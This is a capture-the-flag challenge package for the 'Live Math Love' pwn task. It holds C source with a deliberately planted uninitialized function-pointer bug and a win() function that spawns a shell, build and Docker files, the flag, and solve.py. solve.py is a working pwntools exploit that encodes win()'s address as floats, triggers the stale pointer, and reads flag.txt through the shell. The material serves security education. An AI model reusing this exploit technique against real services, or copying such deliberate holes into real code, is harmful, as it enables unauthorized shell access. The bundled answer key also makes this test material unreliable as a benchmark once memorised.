{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]",
    "flag.txt": "gigem{m47h3m461c4l!}",
    "live_math_love.c": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid win()  {\n    system(\"/bin/sh\");\n}\n\nvoid add() {\n    float a;\n    float b;\n    scanf(\"%f\\n\", &a);\n    scanf(\"%f\\n\", &b);\n\n    printf(\"%f\\n\", a+b);\n}\n\nvoid sub() {\n    float a;\n    float b;\n    scanf(\"%f\\n\", &a);\n    scanf(\"%f\\n\", &b);\n\n    printf(\"%f\\n\", a-b);\n}\n\nvoid mult() {\n    float a;\n    float b;\n    scanf(\"%f\\n\", &a);\n    scanf(\"%f\\n\", &b);\n\n    printf(\"%f\\n\",a*b);\n}\n\n\nvoid menu() {\n    printf(\"LIVE MATH LOVE\\n\");\n    printf(\"1. Add\\n\");\n    printf(\"2. Subtract\\n\");\n    printf(\"3. Multiply\\n\");\n    printf(\"> \");\n\n    void (*action)();\n    int choice;\n    scanf(\"%d\\n\", &choice);\n\n    if (choice == 1) {\n        action = add;\n    } else if (choice == 2) {\n        action = sub;\n    } else if (choice == 3) {\n        action = mult;\n    }\n\n    action();\n\n    menu();\n}\n\n\nvoid main() {\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n\n    menu();\n\n}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -O0 -no-pie\nNAME := live_math_love\nPORT := 7004\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c solver-template.py\n\n.PHONY:\n",
    "README.md": "# Live Math Love \n## Description \nI made this cool calculator. Hope there's nothing vulnerable in here \n## Solution \nSee `solve.py`.",
    "solve.py": "from pwn import *\nimport struct\n\n\ne = ELF('./live_math_love')\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"live-math-love\")\n\nwin = e.symbols['win']\nwin_broken = p64(win)\n(first,) = struct.unpack('f', win_broken[:4])\n(second,) = struct.unpack('f', win_broken[4:])\n\np.sendline(b'1')\np.sendline('{:.50f}'.format(second).encode('ascii'))\np.sendline('{:.50f}'.format(first).encode('ascii'))\np.sendline(b'4')\np.sendline(b'4')\n\np.sendline(b'cat flag.txt')\np.interactive()\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"live-math-love\")\np.interactive()\n",
    "category": "pwn"
}